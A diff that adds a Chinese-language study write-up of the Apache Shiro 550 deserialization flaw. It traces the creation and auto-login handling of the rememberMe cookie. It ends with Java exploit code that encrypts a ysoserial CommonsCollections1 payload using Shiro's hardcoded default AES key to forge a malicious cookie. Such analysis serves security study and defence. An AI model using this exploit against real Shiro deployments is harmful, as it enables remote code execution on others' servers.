@@ -1610,3 +1610,159 @@ shiro550的主要漏洞点是rememberMe参数，我们来看看勾选了remember
 
 如果为true则进入`rememberIdentity`流程，先从authcInfo获取了账号主体，这一步是通过LinkedHashMap来追踪账号主体
 
+<img src="image/image-20231122102100281.png" alt="image-20231122102100281" style="zoom:80%;" />
+
+接着带着subject和主体进入下一个重载方法
+
+![image-20231212195605897](image/image-20231212195605897.png)
+
+![image-20231212195622570](image/image-20231212195622570.png)
+
+将帐户主体converting成字节数组的这一步就是我们的重点，直接跟进
+
+![image-20231212200020757](image/image-20231212200020757.png)
+
+通过文档了解到这一步是为了把主体集合转换成“记住登录”的数组，首先通过serialize将主体序列化为字节数组
+
+<img src="image/image-20231122103037285-17023825326413.png" alt="image-20231122103037285" style="zoom:80%;" />
+
+接着调用`getCipherService`获取加密服务对字节数组进行加密，也就是之前提到的AES加密流程
+
+![image-20231212200418432](image/image-20231212200418432.png)
+
+![image-20231122103304955](file://C:/Users/%E7%A4%BC%E7%BC%94/Desktop/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95Markdown/%E9%9D%A2%E8%AF%95/image/image-20231122103304955.png?lastModify=1702380578)
+
+接着返回加密后的字节数组，回到`rememberIdentity`方法，进入最后一步`rememberSerializedIdentity`
+
+![image-20231212202621003](image/image-20231212202621003.png)
+
+![image-20231212202624264](image/image-20231212202624264.png)
+
+在此处实现
+
+![image-20231212202714929](image/image-20231212202714929.png)
+
+![image-20231212202831786](image/image-20231212202831786.png)
+
+后面的步骤就很好理解了，先对传入的加密后的字节数组进行一次Base64编码，然后获取cookie模板创建一个SimpleCookie对象，接着通过操作SimpleCookie对象，把最终的rememberMe放进HTTP请求中的cookie
+
+![image-20231212203700858](image/image-20231212203700858.png)
+
+![image-20231212210153458](image/image-20231212210153458.png)
+
+![image-20231212210251085](image/image-20231212210251085.png)
+
+![image-20231212210319663](image/image-20231212210319663.png)
+
+![image-20231212211038258](image/image-20231212211038258.png)
+
+至此，整个产生rememberMe的流程分析完毕
+
+##### rememberMe自动登录
+
+上面分析了rememberMe产生的过程，接下来我们带着rememberMe直接访问，还是在登录判断处下断点
+
+一路跟进到`DefaultSecurityManager`的login方法，在验证完token之后会通过`createSubject`创建登录后的Subject对象
+
+![image-20231212214617270](image/image-20231212214617270.png)
+
+我们直接跟进到`createSubject`方法
+
+![image-20231212214743291](image/image-20231212214743291.png)
+
+带着注释简单分析一下过程，首先通过`ensureSecurityManager`补充上SecurityManager实例，然后通过`resolveSession`解析Session，接着通过`resolvePrincipals`方法解析用户主体，最后再用context创建Subject实例
+
+触发点就在解析用户主体的过程中，我们直接跟进
+
+![image-20231212215426336](image/image-20231212215426336.png)
+
+这里的principals是获取账号主体，如果是空才会进入492行，所以我们直接用hackbar发包，代替不输入账号密码，仅携带rememberMe的情况
+
+![image-20231212221443798](image/image-20231212221443798.png)
+
+![image-20231212222050946](image/image-20231212222050946.png)
+
+为空，所以直接进入getRememberedIdentity函数
+
+在这个过程中，先解析了主体，如果主体为空再通过调用`getRememberedIdentity`检查rememberMe身份，跟进
+
+<img src="image/image-20231122132709198.png" alt="image-20231122132709198" style="zoom:80%;" />
+
+这里首先获取`RememberMeManager`，如果不为空则调用rmm的`getRememberedPrincipals`方法，跟进到`CookieRememberMeManager`的`getRememberedPrincipals`方法
+
+<img src="image/image-20231122133353077.png" alt="image-20231122133353077" style="zoom:80%;" />
+
+这其中一共有两个重要方法`getRememberedSerializedIdentity`和`convertBytesToPrincipals`，我们首先看第一个
+
+<img src="image/image-20231122133523076.png" alt="image-20231122133523076" style="zoom:80%;" />
+
+<img src="image/image-20231122134050624.png" alt="image-20231122134050624" style="zoom:80%;" />
+
+通过`getCookie().readValue()`获取cookie中rememberMe的值
+
+<img src="image/image-20231122134155403.png" alt="image-20231122134155403" style="zoom:80%;" />
+
+把value返回后在`getRememberedSerializedIdentity`中进行base64解码，然后转为字节数组并return
+
+回到`getRememberedPrincipals`，如果返回的字节数组不为空则继续下一步`convertBytesToPrincipals`
+
+<img src="image/image-20231122134620971.png" alt="image-20231122134620971" style="zoom:80%;" />
+
+<img src="image/image-20231122134758200.png" alt="image-20231122134758200" style="zoom:80%;" />
+
+这里是获取解密服务，步骤和前面一样，通过AES解密字节数组，最后交给`deserialize`进行反序列化
+
+<img src="image/image-20231122135111765.png" alt="image-20231122135111765" style="zoom:80%;" />
+
+<img src="image/image-20231122135145997.png" alt="image-20231122135145997" style="zoom:80%;" />
+
+<img src="image/image-20231122135238815.png" alt="image-20231122135238815" style="zoom:80%;" />
+
+这就是最终触发反序列化的地方，返回一个账号主体
+
+<img src="image/image-20231122135443143.png" alt="image-20231122135443143" style="zoom:80%;" />
+
+至此，整个rememberMe自动登录的过程分析完毕
+
+#### 利用
+
+经过所有的分析，我们知道了如何通过rememberMe进行反序列化，接下来构造exp利用
+
+首先用ysoserial生成CC1的payload
+
+<img src="image/image-20231122192403843.png" alt="image-20231122192403843" style="zoom:80%;" />
+
+接下来我们来构造EXP
+
+```java
+package com.y5neko.sec.shiro;
+
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.crypto.CipherService;
+import org.apache.shiro.util.ByteSource;
+
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+public class Shiro550_Exp {
+    public static void main(String[] args) throws Exception{
+        //我们直接调用shiro的AES服务来进行加密
+        byte[] DEFAULT_CIPHER_KEY_BYTES = org.apache.shiro.codec.Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
+        CipherService cipherService = new AesCipherService();
+
+        //读取payload为字节数组
+        byte[] bytes = Files.readAllBytes(Paths.get("H:\\Java_Project\\Java_Security\\src\\com\\y5neko\\sec\\shiro\\shiro550"));
+        //AES加密
+        ByteSource byteSource = cipherService.encrypt(bytes, DEFAULT_CIPHER_KEY_BYTES);
+        byte[] value = byteSource.getBytes();
+        //Base64编码
+        String base64 = Base64.getEncoder().encodeToString(value);
+        System.out.println(base64);
+    }
+}
+```
+
+<img src="image/image-20231122215219157.png" alt="image-20231122215219157" style="zoom:80%;" />
+
+<img src="image/image-20231122215333208.png" alt="image-20231122215333208" style="zoom:80%;" />
